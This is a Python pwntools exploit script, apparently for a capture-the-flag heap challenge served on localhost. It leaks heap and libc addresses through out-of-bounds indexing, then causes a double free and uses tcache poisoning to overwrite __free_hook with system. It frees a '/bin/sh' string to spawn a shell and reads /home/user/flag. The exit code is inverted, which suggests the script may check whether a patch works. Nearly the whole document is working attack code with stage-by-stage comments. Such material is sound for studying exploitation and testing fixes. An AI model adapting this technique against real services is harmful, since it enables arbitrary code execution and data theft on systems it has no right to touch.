#!/usr/bin/python
from pwn import *
import sys

port = sys.argv[1]
flag = sys.argv[2]

e = ELF("./libc.so.6")

sh = remote("localhost",port)

sendnum = lambda x: sh.sendline(str(x & 0xffffffffffffffff)) 
recvnum = lambda : int(sh.recvuntil('\n'), 10)

def add(v2, v3=0):
	sendnum(5)
	sendnum(v2)
	sendnum(v3)

def select(idx):
	sendnum(4)
	sendnum(idx)
	return recvnum()

def delete(v2):
	sendnum(1)
	sendnum(v2)

#0. prepare
add(3,0)
add(-0x28, 1) #used to clear root by producing nullptr(not useful)
add(2,0)

#rearrange heap
delete(3)
delete(2)
delete(-0x28)
add(3,0)
add(-0x28, 1)
add(2,0)

#1. leak heap
#find a pointer in the heap such that
#	[p + 0x28] == nullptr
#	[p + 8] == heap addr
#that is pointer to btnode with lnode not null
# => p == 0x555555758398
heap_addr = select(0x10a8/8) - 0x1348
print hex(heap_addr)

select(5) # resume the root, idx == 5 is var2 == 2

#2. leak libc
#construct a pointer in the heap such that
#	[p + 0x28] == nullptr
#	[p + 8] == libc addr

# use manager.buf to construct unsorted bin
for i in xrange(0, 0x90):
	add(4 + i)
delete(0x35) # construct [p + 0x28] == nullptr
for i in xrange(0x90, 0xa0-5):
	add(4 + i)
# p == 0x3150
empty_root2 = heap_addr + 0x57c8
add(empty_root2) # used to prevent cycling
empty_root = heap_addr + 0x5788
add(empty_root) # used to prevent cycling
add(heap_addr + 0x3100)
add(u64("/bin/sh\x00")) 
#some preparation for shell

hv2 = heap_addr + 0x3150
add(hv2)

libc_addr = select(-7296 / 8) - 0x3ebca0
print hex(libc_addr)

select(0x528/8) # the one with var2 == heap150 is root

#3. get shell
#delete a root node with parent == nullptr
#select such that root points to the freed root node
#free it, cause double free
#tcache poison to rewrite __free_hook
delete(hv2) #delete root
select(-7456/8) #reset root to freed root node
delete(0) #double free, 0x50 chunk poisoned, var2 == next == nullptr == 0
select(-7536/8) #prevent cycle maybe? it will loop forever if we don't have this
#reset the root to prevent cycling, the fake root must be empty

add(libc_addr + e.symbols["__free_hook"])
select(-7616/8) #reset the root to prevent cycling, the fake root must be empty
add(libc_addr + 0x4f322) # consume bin
add(libc_addr + e.symbols["system"]) # rewrite here

add(u64("/bin/sh\x00")) 
delete(u64("/bin/sh\x00"))

sleep(5)
sh.sendline("cat /home/user/flag")
sh.sendline("cat /home/user/flag")
sh.sendline("cat /home/user/flag")
sh.recv()
if flag in sh.recv(4096):
    sys.exit(False)
else:
    sys.exit(True)
